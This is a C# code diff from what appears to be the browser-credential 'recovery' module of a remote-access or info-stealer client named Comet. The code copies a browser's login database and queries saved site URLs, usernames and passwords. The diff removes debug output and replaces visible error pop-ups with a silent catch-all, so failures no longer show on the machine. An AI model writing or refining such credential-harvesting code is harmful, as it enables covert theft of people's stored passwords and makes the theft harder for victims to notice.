@@ -48,12 +48,8 @@ namespace Comet.Client.Recovery.Browsers
                 {
                     File.Copy(filePath, filePath + "B",true);
                     filePath += "B";
-                    //SQLiteDatabase database = new SQLiteDatabase(filePath);
                     string query = "SELECT origin_url, username_value, password_value FROM logins";
                     string connectionString = "data source=" +  filePath + ";version=3;";
-                    //DataTable resultantQuery = database.ExecuteQuery(query);
-                    //DataSet ds = DbHelperSQLite.Query(query);
-
                     using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                     {
                         DataSet ds = new DataSet();
@@ -62,19 +58,11 @@ namespace Comet.Client.Recovery.Browsers
                             connection.Open();
                             SQLiteDataAdapter command = new SQLiteDataAdapter(query, connection);
                             command.Fill(ds, "ds");
-                            var table = ds.Tables[0];
-                            Debug.WriteLine($"Rows count: {table.Rows.Count}");
-                            Debug.WriteLine($"Columns: {string.Join(", ", table.Columns.Cast<DataColumn>().Select(c => c.ColumnName))}");
                         }
-                        catch (System.Data.SQLite.SQLiteException ex)
+                        catch (Exception)
                         {
-                            MessageBox.Show(ex.Message);
+                            //MessageBox.Show("Error while reading the database: " + ex.Message);
                         }
-                        catch (Exception ex)
-                        {
-                            MessageBox.Show("Error while reading the database: " + ex.Message);
-                        }
-
                         foreach (DataRow row in ds.Tables[0].Rows)
                         {
                             string password = "";
